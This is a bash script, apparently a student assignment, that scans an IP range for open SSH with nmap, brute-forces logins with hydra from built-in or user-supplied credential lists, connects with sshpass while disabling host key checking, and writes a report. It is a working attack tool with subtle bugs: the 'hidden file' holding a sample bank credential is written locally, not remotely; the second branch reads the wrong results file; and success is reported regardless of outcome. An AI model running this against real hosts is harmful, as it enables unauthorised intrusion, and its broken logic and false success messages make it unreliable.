#!/bin/bash

#1.1 Prompt the user for an IP range or subnet to scan
read -p "Enter IP range or subnet (X.X.X.X-Y or X.X.X.X/Y): " target

if [[ -z "$target" ]]; then
	echo "Invalid input"
	exit 1
fi

#1.2 Validate that the provided range is corrrectly formateted
#Subnet validation
if [[ $target =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]]; then
	echo "Subnet valid"
#Range validation
elif [[ $target =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-[0-9]{1,3}$ ]]; then
	echo "IP range valid"
else
	echo "Invalid format"
fi

#2.1 Scan the validated IP range specifically for hosts with SSH running
#2.2 Collect and list all IPs that have an active SSH service
echo "Scanning for SSH on $target..."
nmap $target -p22 --open -T4 -oG openssh.txt > /dev/null
listofhosts=$(cat openssh.txt | grep "22/open" | awk '{print $2}')
echo "List of all IP with active SSH service: "
echo "$listofhosts"

#3.1 Allow the tool to use either a built-in list of SSH credentials or accept a user-provided credentials file.
echo "Choose a list of credentials of your choice: "
read -p "1) Built-in list of SSH credentials 2) User-provided credentials file: " choice
if [[ $choice == "1" ]]; then
	echo "Built-in list of SSH credentials selected"
	
#3.2 Attempt to bruteforce SSH logins on the discovered hosts using these credentials
	echo "curry" > userbicreds.txt		#1
	echo "kali" >> userbicreds.txt		#2
	echo "duck" >> userbicreds.txt		#3

	echo "curry" > pwbicreds.txt		#1
	echo "chicken" >> pwbicreds.txt		#2
	echo "kali" >> pwbicreds.txt		#3
	
	> hydraresults.txt
	hydra -L userbicreds.txt -P pwbicreds.txt $listofhosts ssh -vV -o hydraresults.txt -W 5 > /dev/null 2>&1
	
	user1=$(cat hydraresults.txt | grep login | awk '{print $(NF-2)}')
	password1=$(cat hydraresults.txt | grep login | awk '{print $(NF-0)}')	
	echo "SSH login successful for $listofhosts. The credentials are $user1 : $password1."

#4.1 On successful login, run a predefined command on the remote machine non-interactively (for example, create a hidden file as a proof of concept).
#4.2 Do not open an interactive shell; all actions should be automated commands.
	touch hiddenfile.txt
	mv hiddenfile.txt .hiddenfile.txt
	echo "UOB Bank Account User:Password = joetay1234:password" > .hiddenfile.txt
	echo "List down the files (File name with "." in front are hidden files):"
	ls -a

#5.1 Handle the SSH password passing automatically without interactive prompts
#5.2 Bypass host key verification prompts to ensure full automation
	sshpass -p "$password1" ssh -o "StrictHostKeyChecking no" kali@$listofhosts

#5.3 All tools required for this project should be checked if it's installed on the device or else, let the user choose to install or exit the program
checktool()
	{
		if ! command -v "$1"; then
			echo "$1 is not installed."
			read -p "Do you want to install $1? (y/n): " choice1
			if [[ $choice1 == y ]]; then
				echo "The password is $password1"
				sudo apt install "$1"
			elif [[ $choice1 == n ]]; then
				echo "Exiting program."
				exit 1
			fi
		fi
	}
	echo "Tools installed"
	checktool nmap
	checktool sshpass
	checktool ssh
	
#6.1 At the end of the scan and brute force process, generate a report of which IPs were successfully accessed and where the command was executed.
	echo "Scan Target: $target | Command Line: [Line 4-9]" > report.txt
	echo "SSH Hosts Found: $listofhosts | Command Line: [Line 23-28]" >> report.txt
	echo "Successful Login: $listofhosts  | Command Line: [Line 37-50]" >> report.txt
	echo "Credentials: $user1 : $password1  | Command Line: [Line 48-50]" >> report.txt
	echo "Hidden file was created: hiddenfile1.txt | Command Line: [Line 54-58]" >> report.txt

#3.2 Attempt to bruteforce SSH logins on the discovered hosts using these credentials	
elif [[ $choice == "2" ]]; then
	echo "User-provided credentials file selected"
	read -p "Enter name of user credential file: " userfile
	file="$userfile.txt"
	read -p "Enter name of password credential file: " passwordfile
	file="$passwordfile.txt"
	read -p "Number of pairs of credentials to add " n
	
	for ((i=1; i<=n;i++))
	do
		read -p "User: " user
		read -p "Password: " pw
		echo "$user" >> "$userfile"
		echo "$pw" >> "$passwordfile"
	done
		echo "User provided credential file SAVED"
	> hydraresults2.txt
	hydra -L "$userfile" -P "$passwordfile" $listofhosts ssh -vV -o hydraresults2.txt -W 5 > /dev/null 2>&1
	
	user2=$(cat hydraresults.txt | grep login | awk '{print $(NF-2)}')
	password2=$(cat hydraresults.txt | grep login | awk '{print $(NF-0)}')	
	echo "SSH login successful for $listofhosts. The credentials are $user2 : $password2."

#4.1 On successful login, run a predefined command on the remote machine non-interactively (for example, create a hidden file as a proof of concept).
#4.2 Do not open an interactive shell; all actions should be automated commands.
	touch hiddenfile2.txt
	mv hiddenfile2.txt .hiddenfile2.txt
	echo "UOB Bank Account User:Password = joetay1234:password" > .hiddenfile2.txt
	echo "List down the files (File name with "." in front are hidden files):"
	ls -a
	
#5.1 Handle the SSH password passing automatically without interactive prompts
#5.2 Bypass host key verification prompts to ensure full automation
	sshpass -p "$password2" ssh -o "StrictHostKeyChecking no" kali@$listofhosts
	
#5.3 All tools required for this project should be checked if it's installed on the device or else, let the user choose to install or exit the program
checktool()
	{
		if ! command -v "$1"; then
			echo "$1 is not installed."
			read -p "Do you want to install $1? (y/n): " choice1
			if [[ $choice1 == y ]]; then
				sudo apt install "$1"
			elif [[ $choice1 == n ]]; then
				echo "Exiting program."
				exit 1
			fi
		fi
	}

	checktool nmap
	checktool sshpass
	checktool ssh
#6.1 At the end of the scan and brute force process, generate a report of which IPs were successfully accessed and where the command was executed.
	echo "Scan Target: $target | Command Line: [Line 4-9]" > report.txt
	echo "SSH Hosts Found: $listofhosts | Command Line: [Line 23-28]" >> report.txt
	echo "Successful Login: $listofhosts | Command Line: [Line 92-113] " >> report.txt
	echo "Credentials: $user2 : $password2 | Command Line: [Line 111-113]" >> report.txt
	echo "Hidden file was created: hiddenfile2.txt | Command Line: [Line 117-121]" >> report.txt
	
else
	echo "Invalid entry"
fi	
